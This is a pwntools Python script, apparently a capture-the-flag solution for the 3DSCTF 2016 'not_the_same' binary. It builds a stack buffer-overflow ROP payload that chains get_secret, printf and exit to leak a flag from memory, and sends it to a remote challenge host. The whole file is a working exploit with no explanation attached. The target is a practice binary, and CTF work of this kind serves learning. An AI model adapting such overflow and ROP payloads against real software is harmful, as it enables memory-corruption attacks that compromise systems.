#!/usr/bin/python3.6
from pwn import *

exec_path = './not_the_same_3dsctf_2016'
elf = ELF(exec_path)
# proc = process(exec_path)
proc = remote("node3.buuoj.cn", 28179)


get_secret = elf.sym['get_secret']
log.info(f'get_secret={hex(get_secret)}')

printf = elf.sym['printf']
log.info(f'printf={hex(printf)}')

exit_ = elf.sym['exit']
log.info(f'exit={hex(exit_)}')

array_addr = 0x080ECA2D
pop_ret = 0x080481ad
payload = b'i' * 0x2d + p32(get_secret) + p32(printf) + p32(pop_ret) + p32(array_addr) + p32(exit_) + p32(0)

proc.sendline(payload)
log.info(f'output={proc.recv(numb=128)}')
